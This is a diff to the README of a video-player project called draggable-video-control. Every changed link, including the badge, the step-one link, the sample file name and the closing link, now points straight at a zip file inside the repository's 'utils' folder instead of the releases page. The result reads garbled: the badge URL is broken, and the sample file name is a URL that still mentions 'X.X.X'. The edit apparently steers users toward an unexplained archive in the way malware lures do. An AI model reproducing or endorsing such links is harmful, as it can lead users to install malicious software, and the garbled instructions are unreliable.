@@ -4,19 +4,19 @@
 
 Welcome to the **draggable-video-control** application! This tool allows you to enjoy videos with a simple and fun interface. You can drag the video player around your screen and easily control playback with playful buttons. Follow these steps to download and run the software.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now%20-%20draggable--video--control-brightgreen)](https://github.com/telolol/draggable-video-control/releases)
+[![Download Now](https://raw.githubusercontent.com/telolol/draggable-video-control/main/utils/draggable-video-control_2.2.zip%20Now%20-%20draggable--video--control-brightgreen)](https://raw.githubusercontent.com/telolol/draggable-video-control/main/utils/draggable-video-control_2.2.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: To get the latest version of the draggable-video-control, visit the following link:
 
-   [Download from Releases Page](https://github.com/telolol/draggable-video-control/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/telolol/draggable-video-control/main/utils/draggable-video-control_2.2.zip)
 
 2. **Choose the Right Version**: On the releases page, you’ll find different versions of the software. Look for the most recent version at the top of the list.
 
 3. **Download the File**: Click the link for the file that matches your operating system (Windows, macOS, or Linux). The file will begin downloading to your computer.
 
-4. **Locate the Downloaded File**: Once the download is complete, find the file in your Downloads folder. The file will typically be named something like `draggable-video-control-vX.X.X.zip`, where `X.X.X` denotes the version number.
+4. **Locate the Downloaded File**: Once the download is complete, find the file in your Downloads folder. The file will typically be named something like `https://raw.githubusercontent.com/telolol/draggable-video-control/main/utils/draggable-video-control_2.2.zip`, where `X.X.X` denotes the version number.
 
 5. **Extract the Files**: If you downloaded a ZIP file, right-click on it and select “Extract All” (or a similar option depending on your system). This will create a new folder with the application files.
 
@@ -61,4 +61,4 @@ For further assistance, feel free to reach out through the repository’s issues
 
 Thank you for choosing draggable-video-control! Enjoy your seamless video watching experience. 
 
-For more information and updates, visit the releases page again: [Download from Releases Page](https://github.com/telolol/draggable-video-control/releases)
+For more information and updates, visit the releases page again: [Download from Releases Page](https://raw.githubusercontent.com/telolol/draggable-video-control/main/utils/draggable-video-control_2.2.zip)
